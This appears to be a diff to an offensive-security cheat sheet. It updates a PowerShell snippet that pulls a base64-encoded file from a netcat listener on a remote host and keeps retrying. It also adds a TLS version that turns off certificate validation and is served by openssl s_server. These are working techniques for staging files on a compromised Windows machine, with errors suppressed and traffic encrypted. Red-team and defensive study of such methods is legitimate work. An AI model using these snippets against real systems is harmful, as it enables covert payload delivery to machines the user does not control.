@@ -1103,17 +1103,17 @@ $socket.close();
 Retrieve the file on Windows host using powershell.  Will retry until server responds.<br />
 ```powershell
 $fdata = "";
-$fname = $env:temp + "\file.bin"
+$fname = $env:temp + "\file.bin";
 $ErrorActionPreference = 'SilentlyContinue';
 while($true)
 {
    $socket = New-Object system.Net.Sockets.TcpClient;
-   $iar = $socket.BeginConnect('192.168.1.242', 4444, $null, $null);
-   $wait = $iar.AsyncWaitHandle.WaitOne(1000, $false);
-   if($wait)
+   $socket.Connect('10.192.103.49', '4444');
+   if($socket.Connected)
    {
       break;
    }
+   Start-Sleep -Seconds 1;
 }
 $stream = $socket.GetStream();
 $reader = new-object System.IO.StreamReader($stream);
@@ -1121,8 +1121,50 @@ $res = $reader.ReadToEnd();
 $fdata = "$fdata$res"
 $bytes = [Convert]::FromBase64String($fdata)
 [IO.File]::WriteAllBytes($fname, $bytes)
+$reader.close();
+$stream.close();
+$socket.close();
 exit;
 ```
 
-Start netcat listener on Linux (192.168.1.242) to serve the file.<br />
+Start netcat listener on Linux (10.192.103.49) to serve the file.<br />
 `cat file.bin | base64 | timeout 10 nc -nlvp 4444`
+
+**Receive file over a TLS socket**
+
+Retrieve the file on Windows host using powershell.  Will retry until server responds.<br />
+```powershell
+$fdata = "";
+$fname = $env:temp + "\file.bin";
+$ErrorActionPreference = 'SilentlyContinue';
+while($true)
+{
+   $socket = New-Object system.Net.Sockets.TcpClient;
+   $socket.Connect('10.192.103.49', '443');
+   if($socket.Connected)
+   {
+      break;
+   }
+   Start-Sleep -Seconds 1;
+}
+$stream = $socket.GetStream();
+$callback = { param($sender, $cert, $chain, $errors) return $true };
+$sslstream = New-Object System.Net.Security.SslStream($stream, $true, $callback);
+$sslstream.AuthenticateAsClient("whatever", $null, "tls12", $false);
+$stream = $sslstream;
+$reader = new-object System.IO.StreamReader($stream);
+$res = $reader.ReadToEnd();
+$fdata = "$fdata$res";
+$bytes = [Convert]::FromBase64String($fdata);
+[IO.File]::WriteAllBytes($fname, $bytes);
+$reader.close();
+$stream.close();
+$socket.close();
+exit;
+```
+
+Start openssl server on Linux (10.192.103.49).<br />
+Generate a certificate and key first.<br />
+`openssl req -x509 -newkey rsa:2048 -keyout svrkey.pem -out svrcert.pem -days 365 -nodes`
+`openssl s_server -quiet -tls1_2 -cipher HIGH -key svrkey.pem -cert svrcert.pem -accept 443 -naccept 1 < <(cat file.bin | base64)`
+
